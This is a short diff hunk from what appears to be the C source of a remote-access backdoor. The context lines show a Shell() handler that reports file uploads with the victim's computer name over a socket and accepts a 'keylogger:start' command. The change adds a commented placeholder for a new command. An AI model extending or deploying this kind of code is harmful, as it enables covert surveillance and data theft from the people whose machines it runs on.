@@ -121,6 +121,10 @@ void Shell()
       sprintf(suc, "[+] File %s uploaded successfully on `%s`.\n", filename, getenv("COMPUTERNAME"));
       send(sock, suc, sizeof(suc), 0);
     }
+    // ADD NEW FEATURE HERE
+    // else if() {
+    //   // Handle new feature
+    // }
     else if (strcmp("keylogger:start", buffer) == 0)
     {
       // info("Starting Keylogger..");
